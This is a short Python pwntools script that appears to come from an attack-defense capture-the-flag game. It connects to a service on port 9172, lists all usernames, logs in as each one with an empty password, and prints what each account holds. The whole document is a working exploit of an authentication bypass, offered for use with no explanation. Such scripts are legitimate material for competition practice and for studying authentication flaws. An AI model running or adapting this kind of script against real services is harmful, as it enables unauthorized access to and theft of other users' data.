#!/usr/bin/env python3

import sys
from pwn import *

ip = sys.argv[1]

r = remote(ip, 9172)

r.recvuntil("> ")
r.sendline("3")
s = r.recvuntil("Welcome").decode().strip("Welcome").strip().split("\n")

for u in s:
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Input username: ")
    r.sendline(u)
    r.recvuntil("Input password: ")
    r.sendline("")
    r.recvuntil("> ")
    r.sendline("3")
    print(r.recvuntil("Welcome"), flush=True)
    r.recvuntil("> ")
    r.sendline("4")